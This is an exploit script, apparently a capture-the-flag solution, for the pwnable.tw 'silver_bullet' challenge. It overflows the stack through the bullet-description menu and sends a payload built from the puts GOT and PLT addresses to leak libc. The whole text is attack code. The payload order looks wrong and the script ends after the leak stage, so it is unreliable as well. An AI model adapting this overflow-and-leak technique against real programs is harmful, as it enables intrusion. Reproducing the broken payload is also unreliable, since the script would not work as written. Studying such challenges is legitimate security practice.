from pwn import *

context.log_level='DEBUG'


r=remote('chall.pwnable.tw',10103)
file=ELF('./silver_bullet')
libc=ELF('./libc_32.so.6')
'''
r=remote('127.0.0.1',10001)
#r=process('./silver_bullet',env={"LD_PRELOAD":"./libc_32.so.6"})
file=ELF('./silver_bullet')
libc=ELF('./libc_32.so.6')
'''

#trigger stack overflow
r.recvuntil('Your choice :')
r.sendline('1')
r.recvuntil('Give me your description of bullet :')
r.sendline('a'*47)
r.recv()
r.sendlineafter('Your choice :','2')
#r.sendline('2')
r.recvuntil('Give me your another description of bullet :')
r.sendline('b')

#leak libc
r.recvuntil('Your choice :')
r.recvuntil('2')
r.recvuntil('Give me your another description of bullet :')
start_addr=0x080484F0
payload='b'*8+p32(file.got['puts'])+p32(start_addr)+p32(file.plt['puts'])
payload+=(47-len(payload))*'a'
r.sendline(payload)
r.interactive()




